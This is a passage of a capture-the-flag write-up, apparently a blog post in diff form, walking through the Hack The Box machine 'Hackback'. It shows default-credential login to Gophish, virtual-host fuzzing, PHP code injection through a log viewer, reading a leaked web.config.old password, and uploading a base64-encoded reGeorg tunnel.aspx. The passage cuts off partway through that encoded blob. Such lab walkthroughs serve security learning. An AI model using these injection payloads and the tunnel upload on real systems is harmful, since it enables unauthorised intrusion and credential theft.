+&lt;h4 id=&quot;yes-it-worked-i-added-my-phpsessid-cookie-with-the--b-option-and-i-also-added-it-to-session-because-some-stuff-didnt-work-without-including-the-session-cookie&quot;&gt;Yes it worked. I added my &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; cookie with the &lt;code class=&quot;highlighter-rouge&quot;&gt;-b&lt;/code&gt; option and I also added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;session=&lt;/code&gt;, because some stuff didn’t work without including the session cookie.&lt;/h4&gt;
+&lt;h4 id=&quot;list-showed-us-some-logs-i-tried-the-other-actions-exec-said-missing-command-but-i-couldnt-make-it-execute-anything-init-didnt-output-anything-but-most-likely-its-doing-something-that-doesnt-produce-an-output-also-show-didnt-result-in-any-output-but-we-will-make-it-do-soon&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; showed us some logs. I tried the other actions, &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; said &lt;code class=&quot;highlighter-rouge&quot;&gt;Missing command&lt;/code&gt; but I couldn’t make it execute anything. &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; didn’t output anything but most likely it’s doing something that doesn’t produce an output. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; didn’t result in any output but we will make it do soon.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;gophish&quot;&gt;Gophish&lt;/h3&gt;
+&lt;h4 id=&quot;lets-take-a-look-at-the-full-nmap-scan-&quot;&gt;Let’s take a look at the full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -T5 -p- hackback.htb --max-retries 1 &lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;theres-another-3rd-port--64831-i-scanned-that-port-with-nmap-&quot;&gt;There’s another 3rd port : &lt;code class=&quot;highlighter-rouge&quot;&gt;64831&lt;/code&gt;. I scanned that port with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC -p 64831 hackback.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;its-https-i-went-there-and-it-was-gophish-&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. I went there and it was &lt;code class=&quot;highlighter-rouge&quot;&gt;gophish&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Gophish is a powerful, open-source phishing framework that makes it easy to test your organization’s exposure to phishing. -&lt;a href=&quot;https://getgophish.com/&quot;&gt;getgophish.com&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;i-tried-to-login-with-the-default-credentials--admin--gophish-and-it-worked-&quot;&gt;I tried to login with the default credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;admin : gophish&lt;/code&gt; and it worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-was-kinda-empty-but-i-found-some-email-templates-for-facebook-hackthebox-paypal-and-twitter&quot;&gt;It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-there-are-phishing-sites-somewhere-for-these-sites-and-now-we-can-understand-whats-happening-in-the-secret-path-its-an-endpoint-that-shows-the-collected-data-from-the-phishing-sites-i-created-a-small-list-to-search-for-hackthebox-phishing-site-&quot;&gt;So there are phishing sites somewhere for these sites and now we can understand what’s happening in the secret path. It’s an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hackthebox
+hacktheboxeu
+hackthebox.eu
+htb
+www.hackthebox
+www.hacktheboxeu
+www.hackthebox.eu
+www.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-used-wfuzz-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz -c -w list.txt -H &quot;HOST: FUZZ.htb&quot; http://10.10.10.128
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+*****
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+*****
+
+Target: http://10.10.10.128/
+Total requests: 9
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200     33 L       54 W          614 Ch        &quot;hackthebox&quot;
+000005:  C=200    102 L      345 W         4110 Ch        &quot;www.hackthebox&quot;
+000008:  C=200     33 L       54 W          614 Ch        &quot;www.htb&quot;
+000009:  C=400      6 L       26 W          334 Ch        &quot;&quot;
+000006:  C=200     33 L       54 W          614 Ch        &quot;www.hacktheboxeu&quot;
+000007:  C=200     33 L       54 W          614 Ch        &quot;www.hackthebox.eu&quot;
+000002:  C=200     33 L       54 W          614 Ch        &quot;hacktheboxeu&quot;
+000003:  C=200     33 L       54 W          614 Ch        &quot;hackthebox.eu&quot;
+000004:  C=200     33 L       54 W          614 Ch        &quot;htb&quot;
+
+Total time: 0.492524
+Processed Requests: 9
+Filtered Requests: 0
+Requests/sec.: 18.27319
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;wwwhackthebox-gave-a-different-response-length-so-its-the-right-one-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;www.hackthebox&lt;/code&gt; gave a different response length so it’s the right one. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/15.png&quot; alt=&quot;&quot; /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.hackthebox.htb&lt;/code&gt; :
+&lt;img src=&quot;/images/hackthebox/hackback/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;just-a-fake-hack-the-box-login-page-i-entered-test-credentials-&quot;&gt;Just a fake Hack The Box login page. I entered test credentials :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-checked-the-secret-path-again-and-did-list-&quot;&gt;Then I checked the secret path again and did &lt;code class=&quot;highlighter-rouge&quot;&gt;list&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-logs-increased-by-one-i-did-show-and-found-the-credentials-i-just-sent-&quot;&gt;The logs increased by one. I did &lt;code class=&quot;highlighter-rouge&quot;&gt;show&lt;/code&gt; and found the credentials I just sent :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'                                                                                                        
+[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;php-code-injection-uploading-tunnel&quot;&gt;PHP Code Injection, Uploading Tunnel&lt;/h3&gt;
+&lt;h4 id=&quot;with-a-functionality-like-this-there-might-be-some-injection-somewhere-after-some-attempts-i-tried-php-code-and-it-was-executed-&quot;&gt;With a functionality like this, there might be some injection somewhere. After some attempts I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code and it was executed :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
+[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
+[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-username-is-empty-instead-of-printing-the-text-i-have-sent-which-means-that-it-got-executed-as-php-however-all-the-functions-we-would-use-to-get-rce-like-exec-and-system-are-disabled-so--no-we-wont-have-a-shell-now&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; is empty instead of printing the text I have sent, which means that it got executed as &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt;. However all the functions we would use to get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; like &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; are disabled so … no we won’t have a shell now.&lt;/h4&gt;
+&lt;h4 id=&quot;i-wanted-to-list-the-files-in-the-current-directory-so-i-used-the-scandir-function-&quot;&gt;I wanted to list the files in the current directory so I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;scandir()&lt;/code&gt; function :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('.')); ?&amp;gt;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl -b &quot;PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;amp;site=hackthebox&amp;amp;password=12345678&amp;amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
+[05 July 2019, 05:06:37 PM] 10.10.xx.xx - Username: Array
+(
+    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; index.html
+    [3] =&amp;gt; webadmin.php
+)
+, Password: whatever
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-went-up-one-directory-&quot;&gt;I went up one directory :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php print_r(scandir('..')); ?&amp;gt;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; 2bb6916122f1da34dcd916421e531578
+    [3] =&amp;gt; App_Data
+    [4] =&amp;gt; aspnet_client
+    [5] =&amp;gt; css
+    [6] =&amp;gt; img
+    [7] =&amp;gt; index.php
+    [8] =&amp;gt; js
+    [9] =&amp;gt; logs
+    [10] =&amp;gt; web.config
+    [11] =&amp;gt; web.config.old
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;webconfig-and-webconfigold-look-interesting-i-checked-them-and-in-webconfigold-i-found-some-credentials-i-used-the-file_get_contents-function-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; look interesting. I checked them and in &lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; I found some credentials. I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_get_contents()&lt;/code&gt; function :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php echo file_get_contents('../web.config.old'); ?&amp;gt;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;webconfigold-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;web.config.old&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;configuration&amp;gt;
+    &amp;lt;system.webServer&amp;gt;
+        &amp;lt;authentication mode=&quot;Windows&quot;&amp;gt;
+        &amp;lt;identity impersonate=&quot;true&quot;                 
+            userName=&quot;simple&quot; 
+            password=&quot;ZonoProprioZomaro:-(&quot;/&amp;gt;
+     &amp;lt;/authentication&amp;gt;
+        &amp;lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&amp;gt;
+    &amp;lt;/system.webServer&amp;gt;
+&amp;lt;/configuration&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;credentials--simple--zonopropriozomaro--however-theres-no-place-to-use-these-credentials-i-went-back-to-the-http-port-6666-and-i-executed-netstat-i-found-that-winrm-was-running-internally-&quot;&gt;Credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;simple : ZonoProprioZomaro:-(&lt;/code&gt;. However there’s no place to use these credentials. I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port 6666 and I executed &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat&lt;/code&gt;. I found that &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; was running internally :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;CimInstanceProperties&quot;:  [
+                                      &quot;Caption&quot;,
+                                      &quot;Description&quot;,
+                                      &quot;ElementName&quot;,
+                                      &quot;InstanceID = \&quot;::1??49852??::1??5985\&quot;&quot;,
+                                      &quot;CommunicationStatus&quot;,
+                                      &quot;DetailedStatus&quot;,
+                                      &quot;HealthState&quot;,
+                                      &quot;InstallDate&quot;,
+                                      &quot;Name&quot;,
+                                      &quot;OperatingStatus&quot;,
+                                      &quot;OperationalStatus&quot;,
+                                      &quot;PrimaryStatus&quot;,
+                                      &quot;Status&quot;,
+                                      &quot;StatusDescriptions&quot;,
+                                      &quot;AvailableRequestedStates&quot;,
+                                      &quot;EnabledDefault = 2&quot;,
+                                      &quot;EnabledState&quot;,
+                                      &quot;OtherEnabledState&quot;,
+                                      &quot;RequestedState = 5&quot;,
+                                      &quot;TimeOfLastStateChange&quot;,
+                                      &quot;TransitioningToState = 12&quot;,
+                                      &quot;AggregationBehavior&quot;,
+                                      &quot;Directionality&quot;,
+                                      &quot;CreationTime = 12/31/1600 4:00:00 PM&quot;,
+                                      &quot;LocalAddress = \&quot;::1\&quot;&quot;,
+                                      &quot;LocalPort = 49852&quot;,
+                                      &quot;OwningProcess = 0&quot;,
+                                      &quot;AppliedSetting = 6&quot;,
+                                      &quot;OffloadState = 0&quot;,
+                                      &quot;RemoteAddress = \&quot;::1\&quot;&quot;,
+                                      &quot;RemotePort = 5985&quot;,
+                                      &quot;State = 11&quot;
+                                  ],	
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-somehow-we-need-a-proxy-to-run-internally-and-make-us-able-to-connect-to-winrm-luckily-theres-regeorgsocksproxy&quot;&gt;So somehow we need a proxy to run internally and make us able to connect to &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt;. Luckily there’s &lt;a href=&quot;https://github.com/sensepost/reGeorg&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reGeorgSocksProxy&lt;/code&gt;&lt;/a&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;i-downloaded-tunnelaspx-converted-it-to-base-64-then-i-uploaded-it-using-file_put_contents-and-base64_decode-&quot;&gt;I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;tunnel.aspx&lt;/code&gt;, converted it to &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; then I uploaded it using &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;base64_decode()&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php file_put_contents(&quot;tunnel.aspx&quot;,base64_decode(&quot;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsI